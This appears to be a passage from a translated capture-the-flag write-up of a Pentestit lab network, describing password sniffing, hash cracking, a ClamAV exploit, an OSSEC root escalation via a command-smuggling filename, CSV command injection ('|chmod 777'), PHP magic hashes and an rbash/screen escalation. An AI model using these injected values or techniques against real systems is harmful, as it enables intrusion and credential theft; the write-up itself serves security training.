href="https://peternixon.net/news/2012/01/28/configure-tcpdump-work-non-root-user-opensuse-using-file-system-capabilities/">configured differently</a> .  In general, it is useful to check the ability to record traffic on any machine, as it can tell a lot of interesting things.  We do this as follows: <br><br><img src="https://habrastorage.org/web/ab3/eb3/bc2/ab3eb3bc212e4e2897c2aa419b49c817.png" width="100%"><br><br>  After that, opening a file in Wireshark, you can find traffic between 192.168.10.2 and 192.168.10.3 (CLOUD), as follows: <br><br><img src="https://habrastorage.org/web/9a4/71f/33b/9a471f33bf0d4c94bbd5f223cdc26060.png" width="100%"><br><br>  As you can see, we found the user password of the user to the cloud-server.  Let's try to enter: <br><br><img src="https://habrastorage.org/web/80a/b1c/6f2/80ab1c6f2c874ff3a464bfc250716d05.png" width="100%"><br><br>  Happened!  Found keepass-store with the name my_store.kdbx.  Use the keepas2john utility to extract the hash and try to find the password: <br><br><img src="https://habrastorage.org/web/75a/c6b/41e/75ac6b41e7e04b949bf49629c8c877f4.png" width="100%"><br><br>  Configure hashcat, and find the password: <br><br><img src="https://habrastorage.org/web/f2e/50b/b0b/f2e50bb0b63e486eaedde2d2468ceb2d.png" width="100%"><br><br>  Only the last 4 characters of the password are specially blurred in the picture, to facilitate the selection.  The password is present in the rockyou.txt dictionary.  Now it‚Äôs enough to enter this password in keepass and get the CLOUD token! <br><br><h1>  Use CLAMAV </h1><br>  Having scanned 192.168.11.5, we find the sendmail service, which probably is Clamav.  Check the guess using the appropriate <a href="https://www.exploit-db.com/exploits/4761/">exploit</a> .  I had to spend some time before it became clear that backconnect via reverse shell only works on 192.168.10.1 <br>  : <br><img src="https://habrastorage.org/web/e3a/389/f8b/e3a389f8b36d4962b3fc271e5e0d6b38.png" width="100%"><br>  Got a shell!  But the token is not yet available.  Given that the machine has a non-standard configuration for this network in the form of an installed ossec, there is a suspicion that it is necessary to escalate the privileges.  To do this, look for ossec exploits: <br><br><img src="https://habrastorage.org/web/0d9/693/25f/0d969325f8f24d86b901d463fd8b3092.png" width="100%"><br><br>  The most likely exploit number <a href="https://www.exploit-db.com/exploits/37265/">37265</a> is the last available local root exploit to date.  To escalate, do the following: <br><br><ol><li>  Create a file called ‚Äúfoo - $ (chmod 777 etc)‚Äù in the home directory / home / clamav (we cannot use slashes, and ossec commands are executed in the root directory ‚Äî if you want, you can bypass this restriction through cd) </li><li>  Edit this file and create another one in the same directory. </li><li>  When the necessary rights to the etc folder are set, delete the passwd file, and then create the one we need with another user with ID 0 and a known password </li><li>  Make su to this user </li></ol><br>  In our case, as it turned out, it is enough to read the contents of the root directory, which we will do: <br><br><img src="https://habrastorage.org/web/7c4/8d3/8a9/7c48d38a9d154b94b37e3c8098364a18.png" width="100%"><br><br>  Clamav token received.  Upon completion, it is worth returning the rights to the directories to the site, so as not to spoil the passage of other participants. <br><br><h1>  Token ACCESS CONTROL </h1><br>  Having connected as aengineer to the machine 172.16.0.16, we find the following: <br><br><img src="https://habrastorage.org/web/5aa/c3b/c67/5aac3bc670994fcaa9b195897a877c10.png" width="100%"><br><br>  The token is available only from the user www-data, and is not accessible through the web server due to strict permissions.  After examining the source code ftpclient.py, login.php and parse.php, the following becomes clear: <br><br><ol><li>  To log in, just go to <a href="http://172.16.0.16/parse.php%3Fauth%3DasdfgtgrfedQWERsdfd">172.16.0.16/parse.php?auth=asdfgtgrfedQWERsdfd</a> </li><li>  The parse.php file displays data from db.csv, which is periodically downloaded from the FTP server 172.16.0.17 using ftpclient.py and the credentials specified in it <br></li><li>  The download is performed as root, so there is no possibility to change the file on the client. </li><li>  Inside the parse.php file, the date is converted from db.csv to another format, with command injection vulnerability present. <br><br><img src="https://habrastorage.org/web/4e1/5a0/650/4e15a06501864bbcaf264b01cb7f0f79.png" width="100%"><br></li><li>  The token is available exclusively for reading from the user www-data. </li></ol><br>  Thus, in order to escalate the privileges to www-data, we need to embed the necessary command in the db.csv file: <br><br><pre> <code class="bash hljs">Name;Surname;In;Out;ID Mireya;Bain;1498292760.0|chmod 777 /var/www/html/token.sec;1498310760.0;38611</code> </pre><br>  From ftpclient.py, you can extract the login and password to the FTP server at 172.16.0.17, but unfortunately, the db.csv file on it is available only for us to read, so there is no possibility to replace it.  At this stage, it is useful to remember that we already have the aengineer user‚Äôs SSH key extracted from 192.168.11.1 - we‚Äôll try to log in under it: <br><br><img src="https://habrastorage.org/web/b33/21a/deb/b3321adeba6f42aca32f0c600965c871.png" width="100%"><br><br>  It worked!  And now, as can be seen from the access rights, aengineer has the ability to write to db.csv.  Updating the file manually, we notice that it is constantly updated from some database.  To ensure that the new file is always available, we write a small loop on bash: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> python -c <span class="hljs-string"><span class="hljs-string">'print "Name;Surname;In;Out;ID\nMireya;Bain;1498292760.0|chmod 777 /var/www/html/token.sec;1498310760.0;38611"'</span></span> &gt; db.csv; sleep 2; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre><br>  And now, the db.csv file has been updated to 172.16.0.16! <br><br><img src="https://habrastorage.org/web/eb4/c36/070/eb4c36070cf14169a8022898e669fa3d.png" width="100%"><br><br>  Now we go to the parse.php page to execute the command from db.csv: <br><br><img src="https://habrastorage.org/web/c42/f64/d9a/c42f64d9a1894d298e852f9427cae8c7.png" width="100%"><br>  Now we can read the token! <br><br><img src="https://habrastorage.org/web/4bb/cca/40a/4bbcca40aa204a58942a9456ec1ec51b.png" width="100%"><br><br>  Then, we return the previous 400 rights to the token.sec file in the same way so as not to spoil the passage of other laboratory participants.  Another token taken. <br><br><h1>  Magical HELPDESK </h1><br>  As you can see, there are several machines in this laboratory that are either of no interest or practically invulnerable - this makes the laboratory even closer to a real network where not every computer on the network is vulnerable.  Therefore, it is important to continue scanning the network in order to constantly search for new services. <br><br>  So, having scanned 192.168.11.3, we find the open 80th port on which the Ticket service application, or HELPDESK is picked up: <br><br><img src="https://habrastorage.org/web/da8/315/0be/da83150be1c94690b8ab2cd8f2f6716a.png" width="100%"><br>  Looking for hidden directories using dirsearch, we find the folders <b>/ admin</b> (closed by basic authentication), <b>/ _admin</b> with a copy of the login.php file, <b>/ templates</b> with the file head.html, and several less interesting folders like fonts and css. <br><br>  After studying the application, you can see that when you go to different pages inside, we are required to log in under different users - from user to oper_1 / 2 and admin - obviously, our main goal. <br><br>  Despite the fact that the cat parameter in the URL hints at the Local File Inclusion type vulnerability, based on the failed attempts and the /templates/head.html file, we can conclude that this vulnerability is missing.  In addition, having checked the SQL and NoSQL injections, and several other vulnerabilities, we decide to try to find passwords for the specified users: admin / user / oper_1 / oper_2, as well as the users mentioned in the tickets: <br><br><img src="https://habrastorage.org/web/ef7/1c1/9eb/ef71c19eb59845038000ca4c0c0364d3.png" width="100%"><br>  Using Burp Suite in the same way as with CRM, only in Cluster Bomb mode, we managed to select user / password and oper_2 / oper_2 passwords, but, unfortunately, none of them were suitable for logging in as admin.  In addition, the hope that the edit or delete ticket forms will be available, and if any vulnerabilities can be found in them, it has disappeared. <br><br>  In my opinion, this token was the most complex and interesting in the laboratory.  Before us is a web application with only two entry points: /login.php and /_admin/login.php, neither of which contains vulnerabilities that can be detected with the naked eye. <br><br>  After studying the tickets, we draw attention to the fact that according to the legend, the authors of the application have corrected some problems in hashing.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Looking for </font></font><a href="https://www.google.com/search%3Fsite%3D%26source%3Dhp%26q%3Dphp%2Bhash%2Bvulnerability"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php hash vulnerability</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> we find the key to the solution - </font></font><a href="https://www.whitehatsec.com/blog/magic-hashes/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Magic Hashes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . This article describes in some detail the essence of the vulnerability ( </font></font><a href="http://russiansecurity.expert/2015/06/14/magic-hash-again/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the Russian version is</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> also available), so I will not repeat the detailed description here. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The vulnerability lies in the fact that due to PHP type juggling, a situation may occur when different hashes (be it MD5, SHA1 or others) from different passwords will be equal due to automatic type conversion.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Having tried the hashes given in the article as passwords to the admin user on both pages of login.php, after long attempts comes the understanding that perhaps the hash is taken from username + password. </font><font style="vertical-align: inherit;">Then, in order not to look for a new hash that meets the requirements, we try to ‚Äúsplit‚Äù the MD5 and SHA1 hashes into two parts, and go under the admin using this link: </font></font><br> <a href="http://192.168.11.3/_admin/login.php%3Flogin%3D10932%26password%3D435112"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://192.168.11.3/_admin/login.php?login=10932&amp;password=435112</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Finally, the Removed Tickets tab becomes available, where the long-awaited HELPDESK token awaits us, along with the SSH password for getting the SCREEN token:</font></font><br><br><img src="https://habrastorage.org/web/5bc/0de/65a/5bc0de65a832478a876b850f1cd6d019.png" width="100%"><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Raising Privileges on SCREEN </font></font></h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Having received the password to the SSH server from HELPDESK, we can go in and look around: </font></font><br><br><img src="https://habrastorage.org/web/386/4a9/867/3864a98670e140c3ab3dbb2f4abe0cf9.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">But, unfortunately, not far away - we are restricted to the restricted bash (rbash) shell, which prohibits accessing the shared file system and using slashes in commands. Usually, getting out of a restricted bash can be quite simple, like this: </font></font><br><br><img src="https://habrastorage.org/web/76f/682/5d8/76f6825d8a1f4284973896744830d1e4.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Looking around in the main system, we see that the token is in / home / tester / token, but we don‚Äôt have the rights to read it. In addition, there is an entry in cron on the machine, which executes the following script: </font></font><br><br><img src="https://habrastorage.org/web/0b4/c74/9f3/0b4c749f30c24441b5ec879345efc35e.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here is the </font><font style="vertical-align: inherit;">script </font><font style="vertical-align: inherit;">source code:</font></font><br><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/perl -w if (!-l $ARGV[0] &amp;&amp; -f $ARGV[0]) { open $file1, $ARGV[0]; $fname = &lt;$file1&gt;; chomp($fname); open ($file2, $fname) or die("$!"); open $file3, '&gt;&gt;', "/tmp/testlog"; $line = &lt;$file2&gt;; chomp ($line); print $file3 $line, "\n"; close $file2; close $file3; close $file1; unlink($ARGV[0]); sleep(1); open $file1, '&gt;', "/tmp/testlog"; close $file1; } else { exit(0); }</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As can be seen from the script and startup parameters, it gets the name of the file to be read from the file in / build / log /, opens this file and displays the contents in / tmp / testlog, then deletes the processed file in / build / log and waits for one second, during which the contents of the file will be available. Since the command is executed on behalf of the tester user, we can exploit this in order to retrieve the value of the token. The only thing left to do is to create a file in / build / log /, which, unfortunately, does not have access for our user john.</font></font> Let's try to fix it. <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The / build folder also contains a screen in which the SGID bit is set, which means that the screen will be executed on behalf of the utmp group: </font></font><br><br><img src="https://habrastorage.org/web/0f4/41f/8dd/0f441f8dd8e44c3eae1ce76322d6cbd1.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In this case, you can write to the / build / log folder on behalf of the utmp group. Using the -L switch in the screen command you can create such a file: </font></font><br><br><img src="https://habrastorage.org/web/7bb/000/6d4/7bb0006d4da6482da1aae59e13b99290.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As you can see, the file was created successfully on behalf of the user john. We include the rights to write to this file for john, and enter the path to the file we want to read there, and then run the output of the log file in a loop: </font></font><br><br><img src="https://habrastorage.org/web/885/c62/15d/885c6215d10948d0a45adaaf1ae21deb.png" width="100%"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">So, the last SCREEN token is received! </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">All the material here is presented solely for educational purposes, so your comments on the passage of the laboratory are welcome - let as many people as possible learn about different ways of solving a particular task.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I wish good luck to those who have not yet had time to go through the laboratory and experience the joy of taking each car on the network. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Thanks Pentestit for an interesting, challenging and realistic lab! </font><font style="vertical-align: inherit;">Thanks to the reader for reaching this point. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">See you at the new laboratory!</font></font></div><p>Source: <a href="https://habr.com/ru/post/332902/">https://habr.com/ru/post/332902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../332890/index.html">Running Java classes and non-textbook JARs</a></li>
<li><a href="../332892/index.html">Vivaldi Sync: Answers to Questions</a></li>
<li><a href="../332896/index.html">Privileged ports cause global warming</a></li>
<li><a href="../332898/index.html">Why changes in the new Phoenix 1.3 are so important</a></li>
<li><a href="../332900/index.html">ES8 came out and here are its main new features.</a></li>
<li><a href="../332904/index.html">Security issues of Android applications: classification and analysis</a></li>
<li><a href="../332906/index.html">What's new in CUBA Platform 6.5</a></li>
<li><a href="../332908/index.html">A little about the bugs in the BIOS / UEFI of Lenovo / Fujitsu / Toshiba / HP / Dell laptops</a></li>
<li><a href="../332910/index.html">Fly UNIGINE airplanes: a new aircraft simulator for MAKS-2017</a></li>
<li><a href="../332912/index.html">27000 errors in the Tizen operating system</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>